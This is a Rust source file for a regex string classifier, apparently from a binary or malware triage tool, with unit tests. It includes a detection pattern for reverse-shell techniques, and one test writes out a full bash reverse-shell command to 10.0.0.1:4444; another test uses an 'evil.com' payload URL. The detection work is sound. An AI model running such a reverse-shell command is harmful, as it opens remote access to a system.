//! Regex-based string classifier for URLs, IPs, emails, paths, and credentials.

use crate::classify::StringClassifier;
use crate::StringCategory;
use regex::Regex;
use std::sync::OnceLock;

struct PatternEntry {
    regex: Regex,
    category: StringCategory,
    confidence: f32,
}

fn patterns() -> &'static [PatternEntry] {
    static PATTERNS: OnceLock<Vec<PatternEntry>> = OnceLock::new();
    PATTERNS.get_or_init(|| {
        vec![
            PatternEntry {
                regex: Regex::new("(?i)^https?://[^\\s<>\"'{}|\\\\^`\\[\\]]+$").unwrap(),
                category: StringCategory::Url,
                confidence: 0.90,
            },
            PatternEntry {
                regex: Regex::new(
                    r"^(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]\d|\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]\d|\d)$",
                )
                .unwrap(),
                category: StringCategory::IpV4,
                confidence: 0.95,
            },
            PatternEntry {
                regex: Regex::new(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$").unwrap(),
                category: StringCategory::Email,
                confidence: 0.90,
            },
            PatternEntry {
                regex: Regex::new(
                    r"^/(?:usr|etc|var|tmp|home|opt|dev|proc|sys|root|bin|sbin|lib|mnt|run|srv)/[^\s:*?<>|]+$",
                )
                .unwrap(),
                category: StringCategory::UnixPath,
                confidence: 0.85,
            },
            PatternEntry {
                regex: Regex::new(
                    r"(?i)^[A-Z]:\\(?:[^\\/:*?<>|\r\n]+\\)*[^\\/:*?<>|\r\n]*$",
                )
                .unwrap(),
                category: StringCategory::WindowsPath,
                confidence: 0.85,
            },
            PatternEntry {
                regex: Regex::new(
                    r"(?i)^HK(?:EY_(?:LOCAL_MACHINE|CURRENT_USER|CLASSES_ROOT|USERS|CURRENT_CONFIG)|LM|CU|CR)\\",
                )
                .unwrap(),
                category: StringCategory::RegistryKey,
                confidence: 0.95,
            },
            PatternEntry {
                regex: Regex::new(r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$").unwrap(),
                category: StringCategory::CryptoAddress,
                confidence: 0.70,
            },
            PatternEntry {
                regex: Regex::new(r"^0x[0-9a-fA-F]{40}$").unwrap(),
                category: StringCategory::CryptoAddress,
                confidence: 0.80,
            },
            PatternEntry {
                regex: Regex::new(r"^bc1[a-zA-HJ-NP-Z0-9]{25,39}$").unwrap(),
                category: StringCategory::CryptoAddress,
                confidence: 0.85,
            },
            PatternEntry {
                regex: Regex::new(
                    r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----",
                )
                .unwrap(),
                category: StringCategory::PrivateKey,
                confidence: 0.99,
            },
            PatternEntry {
                regex: Regex::new(r"^[A-Za-z0-9+/]{20,}={0,2}$").unwrap(),
                category: StringCategory::Base64Blob,
                confidence: 0.40,
            },
            PatternEntry {
                regex: Regex::new(
                    r"/dev/tcp/|/dev/udp/|pty\.spawn|os\.dup2\(|bash\s+-i\s+>&",
                )
                .unwrap(),
                category: StringCategory::ShellCommand,
                confidence: 0.90,
            },
        ]
    })
}

/// A classifier that uses compiled regexes to categorize strings.
pub struct RegexClassifier;

impl StringClassifier for RegexClassifier {
    fn name(&self) -> &str {
        "regex"
    }

    fn classify(&self, input: &str) -> Vec<(StringCategory, f32)> {
        let mut results = Vec::new();
        for entry in patterns() {
            if entry.regex.is_match(input) {
                results.push((entry.category.clone(), entry.confidence));
            }
        }
        results
    }
}

inventory::submit!(&RegexClassifier as &'static dyn StringClassifier);

#[cfg(test)]
mod tests {
    use super::*;

    fn classify(input: &str) -> Vec<(StringCategory, f32)> {
        RegexClassifier.classify(input)
    }

    #[test]
    fn classifies_url() {
        let r = classify("https://evil.com/payload.exe");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::Url));
    }

    #[test]
    fn classifies_ipv4() {
        let r = classify("192.168.1.1");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::IpV4));
    }

    #[test]
    fn classifies_email() {
        let r = classify("user@example.com");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::Email));
    }

    #[test]
    fn classifies_unix_path() {
        let r = classify("/etc/passwd");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::UnixPath));
    }

    #[test]
    fn classifies_windows_path() {
        let r = classify("C:\\Windows\\System32\\cmd.exe");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::WindowsPath));
    }

    #[test]
    fn classifies_registry_key() {
        let r = classify("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::RegistryKey));
    }

    #[test]
    fn classifies_ethereum_address() {
        let r = classify("0x742d35Cc6634C0532925a3b844Bc9e7595f2bD28");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::CryptoAddress));
    }

    #[test]
    fn classifies_pem_private_key() {
        let r = classify("-----BEGIN RSA PRIVATE KEY-----");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::PrivateKey));
    }

    #[test]
    fn classifies_shell_command() {
        let r = classify("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::ShellCommand));
    }

    #[test]
    fn no_match_for_garbage() {
        let r = classify("xyzq");
        assert!(r.is_empty());
    }

    #[test]
    fn classifies_btc_legacy_address() {
        // BTC legacy addresses start with 1 or 3
        let r = classify("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::CryptoAddress));
    }

    #[test]
    fn classifies_btc_bech32_address() {
        // BTC bech32 addresses start with bc1
        let r = classify("bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::CryptoAddress));
    }

    #[test]
    fn classifies_base64_blob() {
        let r = classify("SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBiYXNlNjQgdGVzdA==");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::Base64Blob));
    }

    #[test]
    fn classifier_name() {
        let classifier = RegexClassifier;
        assert_eq!(classifier.name(), "regex");
    }

    #[test]
    fn classifies_http_url() {
        let r = classify("http://example.com/page");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::Url));
    }

    #[test]
    fn classifies_private_key_variants() {
        let r = classify("-----BEGIN PRIVATE KEY-----");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::PrivateKey));

        let r2 = classify("-----BEGIN EC PRIVATE KEY-----");
        assert!(r2.iter().any(|(c, _)| *c == StringCategory::PrivateKey));

        let r3 = classify("-----BEGIN OPENSSH PRIVATE KEY-----");
        assert!(r3.iter().any(|(c, _)| *c == StringCategory::PrivateKey));
    }
}
